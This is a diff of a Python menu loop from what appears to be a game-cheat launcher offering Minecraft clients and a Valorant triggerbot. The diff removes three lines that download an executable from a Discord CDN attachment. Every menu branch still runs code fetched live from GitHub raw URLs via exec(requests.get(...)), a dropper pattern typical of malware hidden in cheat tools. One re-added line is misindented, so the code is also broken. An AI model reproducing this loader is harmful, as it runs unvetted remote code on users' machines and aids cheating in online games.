@@ -55,19 +55,16 @@ while True:
     if gg == '1':
         discord_rp_mc()
         os.system('cls')
-        download('https://cdn.discordapp.com/attachments/1199080496144076881/1217656107049422888/MCCBeta.exe?ex=6604d19e&is=65f25c9e&hm=28b9e47fe1b3ec7356f30177c8fcd507b55d5859068205580282754407a2d659&', 'MCCBeta.exe')
         print("                                             \033[1;39mLoading Minecraft Sections..")
         exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/k/main/Minecraft').text)
     if gg == '2':
         discord_rp_mc()
         os.system('cls')
         print("                                       \033[1;39mLoading Private Client Section..")
-        download('https://cdn.discordapp.com/attachments/1199080496144076881/1217656107049422888/MCCBeta.exe?ex=6604d19e&is=65f25c9e&hm=28b9e47fe1b3ec7356f30177c8fcd507b55d5859068205580282754407a2d659&', 'MCCBeta.exe')
         exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/k/main/Private').text)
     if gg == '3':
         os.system('cls')
         print("                                       \033[1;39mInitializing Valorant TriggerBot..")
-        download('https://cdn.discordapp.com/attachments/1199080496144076881/1217656107049422888/MCCBeta.exe?ex=6604d19e&is=65f25c9e&hm=28b9e47fe1b3ec7356f30177c8fcd507b55d5859068205580282754407a2d659&', 'MCCBeta.exe')
-        exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/vjp231/main/PyClickerTrigger').text)
+       exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/vjp231/main/PyClickerTrigger').text)
     else:
         continue
